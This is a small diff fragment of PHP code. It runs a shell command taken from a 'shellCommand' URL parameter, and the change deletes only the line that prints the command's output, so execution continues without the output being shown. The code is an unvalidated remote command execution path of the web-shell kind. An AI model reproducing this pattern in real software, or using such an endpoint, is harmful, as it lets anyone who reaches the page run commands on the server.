@@ -58,7 +58,6 @@
 	if(isset($_GET['shellCommand'])) {
 		$myCommand = $_GET['shellCommand'];
 		$shellOut = $userInterface->doCommand($myCommand);
-		echo $shellOut;
 	}
 
 
